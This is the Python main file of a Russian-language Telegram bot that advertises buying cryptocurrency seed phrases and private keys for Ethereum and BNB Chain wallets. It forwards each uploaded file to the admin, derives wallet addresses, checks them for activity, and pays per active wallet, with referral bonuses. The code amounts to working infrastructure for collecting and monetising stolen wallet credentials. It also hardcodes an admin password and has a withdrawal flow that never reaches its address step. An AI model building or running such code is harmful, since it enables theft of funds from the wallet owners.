# main.py
import asyncio
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from dotenv import load_dotenv
import aiosqlite

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line, create_withdraw_request, get_pending_withdrawals,
    complete_withdrawal, get_withdrawals_by_date, get_withdrawal_stats
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity


class UploadFile(StatesGroup):
    waiting_file = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()


def humanize_size(size_bytes: int) -> str:
    for unit in ['B', 'KB', 'MB']:
        if size_bytes < 1024.0:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.1f} GB"


MAX_FILE_SIZE = 20 * 1024 * 1024  # 20 MB

# --- Клавиатуры ---
main_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📂 Отправить файл", callback_data="upload")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")],
    [InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
    [InlineKeyboardButton(text="💳 Вывести", callback_data="withdraw")],
    [InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
    [InlineKeyboardButton(text="ℹ️ Правила", callback_data="rules")],
])

admin_panel = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
    [InlineKeyboardButton(text="📤 Заявки на вывод", callback_data="admin_withdrawals")],
    [InlineKeyboardButton(text="📩 Массовая рассылка", callback_data="admin_broadcast")],
    [InlineKeyboardButton(text="🔙 Выход", callback_data="admin_logout")],
])

back_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
])


def get_withdrawal_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_admin")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_withdrawals")]
    ])

def get_request_keyboard(request_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Выплачено", callback_data=f"complete_withdraw_{request_id}")
        ],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_withdrawals")]
    ])


@dp.message(CommandStart())
async def start_cmd(message: Message):
    args = message.text.split()
    referrer_id = None
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            referrer_id = int(args[1].replace("ref_", ""))
        except:
            pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id and referrer_id != message.from_user.id:
        await register_referral(message.from_user.id, referrer_id)

    text = (
        "👋 <b>Добро пожаловать!</b>\n\n"
        "🛒 <b>Скупка SEED-фраз и Private-ключей</b> с транзакциями в сетях:\n"
        "• <b>ERC-20 (Ethereum)</b>\n"
        "• <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "💰 <b>Цены:</b>\n"
        "• 🌱 SEED-фраза — <b>235₽</b>\n"
        "• 🔑 Private-key — <b>145₽</b>\n\n"
        "💸 <b>ПЛАТИМ САМУЮ ВЫСОКУЮ ЦЕНУ</b> + <b>70% от отработки</b> помимо прайса!\n\n"
        "🕒 <b>Выплаты каждый день в 23:00 (МСК)</b>"
    )
    await message.answer(text, reply_markup=main_menu)


@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer(
        "📂 Загрузите файл в формате <b>.txt</b>.\n\n"
        "📌 Поддерживается до <b>20 МБ</b>.\n"
        "🔍 Проверка: уникальность + активность"
    )
    await state.set_state(UploadFile.waiting_file)


@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document: Document = message.document

    # ✅ МГНОВЕННАЯ ОТПРАВКА ФАЙЛА АДМИНУ
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"

    if document.file_size > MAX_FILE_SIZE:
        await message.answer("❌ Файл больше 20 МБ.")
        await state.clear()
        return

    try:
        await bot.send_message(
            ADMIN_ID,
            f"📩 Новый файл от {user_info}\n"
            f"📎 <code>{document.file_name}</code> ({humanize_size(document.file_size)})",
            parse_mode='HTML'
        )
        await bot.send_document(ADMIN_ID, document.file_id)  # ⚡ Мгновенно
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Не удалось отправить файл: {e}")

    # Проверка расширения
    if not document.file_name.endswith(".txt"):
        await message.answer("❌ Поддерживаются только <b>.txt</b> файлы.")
        await state.clear()
        return

    await message.answer("📥 Скачиваю и анализирую файл...")

    try:
        file = await bot.get_file(document.file_id)
        file_data = (await bot.download_file(file.file_path)).getvalue()
        content = file_data.decode("utf-8", errors="replace")
    except Exception as e:
        await message.answer(f"❌ Ошибка чтения файла: {e}")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    total_lines = len(lines)
    if total_lines == 0:
        await message.answer("❌ Файл пуст.")
        await state.clear()
        return

    progress_msg = await message.answer(f"🔄 Обработка строк...\n✅ Обработано: 0 / {total_lines} (0%)")

    new_seeds = 0
    new_keys = 0
    total_reward = 0

    for i, line in enumerate(lines, 1):
        address = None
        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price

        if i % 5 == 0 or i == total_lines:
            percent = (i / total_lines) * 100
            try:
                await progress_msg.edit_text(
                    f"🔄 Обработка строк...\n"
                    f"✅ Обработано: {i} / {total_lines} ({int(percent)}%)"
                )
            except:
                pass

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, total_lines, new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"🎉 Реферал заработал {total_reward}₽\n💸 Вам +{bonus:.2f}₽")
            except: pass

    if total_reward > 0:
        text = (
            f'✅ Файл <b>"{document.file_name}"</b> обработан!\n\n'
            f"📊 Найдено:\n"
            f"   • 🌱 SEED: <b>{new_seeds}</b> × 235₽\n"
            f"   • 🔑 Keys: <b>{new_keys}</b> × 145₽\n\n"
            f"📈 Всего строк: <b>{total_lines}</b>\n"
            f"💰 Заработано: <b>{total_reward:.2f} RUB</b>"
        )
    else:
        text = (
            f'⚠️ В файле <b>"{document.file_name}"</b> не найдено активных кошельков.\n\n'
            f"📈 Всего строк: <b>{total_lines}</b>\n"
            "❌ Баланс не пополнен."
        )

    try:
        await progress_msg.edit_text(text)
    except:
        await message.answer(text, reply_markup=main_menu)

    await state.clear()


@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    try:
        await callback.answer()
        user = await get_user(callback.from_user.id)
        if not user:
            await get_or_create_user(callback.from_user.id, callback.from_user.username or "unknown")
            user = await get_user(callback.from_user.id)

        text = (
            f"👤 <b>Профиль</b>\n\n"
            f"🆔 ID: <code>{user['user_id']}</code>\n"
            f"📝 Строк: {user['total_lines']}\n"
            f"🌱 SEED: {user['unique_seeds']}\n"
            f"🔑 Keys: {user['unique_keys']}\n"
            f"💰 Заработано: {user['balance']:.2f} RUB"
        )

        if callback.message.text != text:
            await callback.message.edit_text(text, reply_markup=back_menu)
        else:
            await callback.answer()
    except Exception as e:
        print(f"🔴 Ошибка: {e}")
        await callback.message.answer("❌ Ошибка загрузки профиля.", reply_markup=back_menu)


@dp.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user = await get_user(callback.from_user.id)
    if not user or user['balance'] <= 0:
        await callback.message.edit_text("❌ Недостаточно средств.", reply_markup=back_menu)
        return
    await callback.message.edit_text(
        f"💰 Ваш баланс: <b>{user['balance']:.2f} RUB</b>\n\n"
        "Введите сумму для вывода (минимум 500₽):"
    )
    await state.set_state(WithdrawState.waiting_for_amount)


@dp.message(WithdrawState.waiting_for_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 500:
            await message.answer("❌ Минимальная сумма вывода — 500₽.")
            return
    except:
        await message.answer("❌ Введите число.")
        return

    user = await get_user(message.from_user.id)
    if not user or amount > user['balance']:
        await message.answer("❌ Недостаточно средств.")
        await state.clear()
        return

    await state.update_data(amount=amount)
    await message.answer("📨 Введите ваш BNB (BEP-20) адрес:")


@dp.message(WithdrawState.waiting_for_address)
async def withdraw_address(message: Message, state: FSMContext):
    address = message.text.strip()
    if not (address.startswith("0x") and len(address) == 42 and all(c in "0123456789abcdefABCDEF" for c in address[2:])):
        await message.answer("❌ Неверный формат BNB-адреса.")
        return

    data = await state.get_data()
    amount = data['amount']
    user = message.from_user

    await create_withdraw_request(user.id, amount, address, user.username or f"ID:{user.id}")

    await message.answer(
        f"✅ Заявка на вывод <b>{amount} RUB</b> отправлена!\n"
        f"Адрес: <code>{address}</code>\n"
        "Администратор обработует запрос в ближайшее время.",
        parse_mode="HTML",
        reply_markup=main_menu
    )
    await state.clear()


# --- Админ-панель ---
@dp.message(F.text == "/admin")
async def admin_login_cmd(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("🔐 Введите пароль:")
    await state.set_state(AdminState.waiting_for_password)


@dp.message(AdminState.waiting_for_password)
async def admin_password_check(message: Message, state: FSMContext):
    if message.text.strip() == "Linar1212@":
        await message.answer("✅ Добро пожаловать!", reply_markup=admin_panel)
        await state.clear()
    else:
        await message.answer("❌ Неверный пароль.")


@dp.callback_query(F.data == "admin_stats")
async def admin_stats_handler(callback: CallbackQuery):
    await callback.answer()
    stats = await get_stats()
    text = (
        "📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: {stats['users']}\n"
        f"📈 Строк: {stats['lines']}\n"
        f"🌱 SEED: {stats['seeds']}\n"
        f"🔑 Keys: {stats['keys']}\n"
        f"💸 Выплачено: {stats['payout']:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=admin_panel)


@dp.callback_query(F.data == "admin_withdrawals")
async def admin_withdrawals(callback: CallbackQuery):
    try:
        await callback.answer()
        requests = await get_pending_withdrawals()

        if not requests:
            stats = await get_withdrawal_stats()
            text = (
                "📭 <b>Нет активных заявок</b>\n\n"
                f"📊 Всего: {stats['total']} | ⏳: {stats['pending']} | ✅: {stats['completed']}"
            )
            await callback.message.edit_text(text, reply_markup=get_withdrawal_keyboard())
            return

        text = "💸 <b>Заявки на вывод</b>\n\n"
        for req in requests:
            text += (
                f"🆔 <code>{req['id']}</code>\n"
                f"👤 <a href='tg://user?id={req['user_id']}'>{req['username']}</a>\n"
                f"💰 {req['amount']:.2f} RUB\n"
                f"📤 <code>{req['address']}</code>\n"
                f"📅 {req['created_at']}\n"
                "──────────────\n"
            )

        stats = await get_withdrawal_stats()
        text += f"\n📊 Всего: {stats['total']} | ⏳: {stats['pending']} | ✅: {stats['completed']}"

        await callback.message.edit_text(text, reply_markup=get_withdrawal_keyboard(), disable_web_page_preview=True)
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        await callback.message.edit_text("❌ Ошибка.", reply_markup=admin_panel)


@dp.callback_query(F.data.startswith("complete_withdraw_"))
async def complete_withdraw_handler(callback: CallbackQuery):
    try:
        request_id = int(callback.data.split("_")[-1])
        result = await complete_withdrawal(request_id)

        if not result:
            await callback.answer("❌ Уже обработана.")
            return

        user_id = result['user_id']
        amount = result['amount']

        try:
            await bot.send_message(
                user_id,
                f"✅ Вам выплачено <b>{amount:.2f} RUB</b>\n"
                "Спасибо за использование сервиса!",
                parse_mode='HTML'
            )
        except:
            pass

        await callback.answer("✅ Выплачено!")
        await admin_withdrawals(callback)
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        await callback.answer("Ошибка.")


@dp.callback_query(F.data == "back_to_admin")
async def back_to_admin(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("Админ-панель:", reply_markup=admin_panel)


@dp.callback_query(F.data == "admin_logout")
async def admin_logout(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("👋 Вы вышли.", reply_markup=main_menu)


@dp.message(F.text.startswith("/withdraws"))
async def filter_withdrawals_by_date_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        date_str = message.text.split()[1]
        requests = await get_withdrawals_by_date(date_str)

        if not requests:
            await message.answer("📭 Нет заявок за эту дату.")
            return

        text = f"📅 <b>Заявки за {date_str}</b>\n\n"
        for req in requests:
            status = "✅" if req['status'] == 'completed' else "⏳"
            text += f"{status} {req['amount']:.2f} RUB → {req['username']}\n"

        await message.answer(text)
    except IndexError:
        await message.answer("📌 Используй: <code>/withdraws ГГГГ-ММ-ДД</code>")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")


# --- Запуск ---
async def main():
    await init_db()
    print("✅ База данных инициализирована")
    print("🚀 Бот запущен...")
    while True:
        try:
            await dp.start_polling(bot, drop_pending_updates=True)
            break
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
